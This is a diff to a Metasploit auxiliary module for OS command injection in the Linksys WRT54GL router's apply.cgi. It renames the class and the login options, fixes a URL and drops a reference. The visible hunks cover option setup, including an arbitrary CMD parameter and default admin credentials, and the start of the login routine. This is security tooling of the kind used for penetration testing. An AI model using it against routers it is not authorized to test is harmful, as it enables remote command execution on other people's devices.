@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -29,7 +29,6 @@ class Metasploit3 < Msf::Auxiliary
       'License'         => MSF_LICENSE,
       'References'      =>
         [
-          [ 'URL', 'http://homesupport.cisco.com/en-eu/support/routers/WRT54GL' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-01' ],
           [ 'URL', 'http://www.s3cur1ty.de/attacking-linksys-wrt54gl' ],
           [ 'EDB', '24202' ],
@@ -43,8 +42,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI',[ true, 'PATH to OS Command Injection', '/apply.cgi']),
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ false, 'Password to login with', 'password']),
+        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword',[ false, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
         OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
         OptAddress.new('LANIP', [ false, 'LAN IP address of the router (default is RHOST)']),
@@ -67,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     #setting up some basic variables
     uri = datastore['TARGETURI']
-    user = datastore['USERNAME']
+    user = datastore['HttpUsername']
     rhost = datastore['RHOST']
     netmask = datastore['NETMASK']
     routername = datastore['ROUTER_NAME']
@@ -76,10 +75,10 @@ class Metasploit3 < Msf::Auxiliary
 
     ip = lan_ip.split('.')
 
-    if datastore['PASSWORD'].nil?
+    if datastore['HttpPassword'].nil?
       pass = ""
     else
-      pass = datastore['PASSWORD']
+      pass = datastore['HttpPassword']
     end
 
     print_status("Trying to login with #{user} / #{pass}")
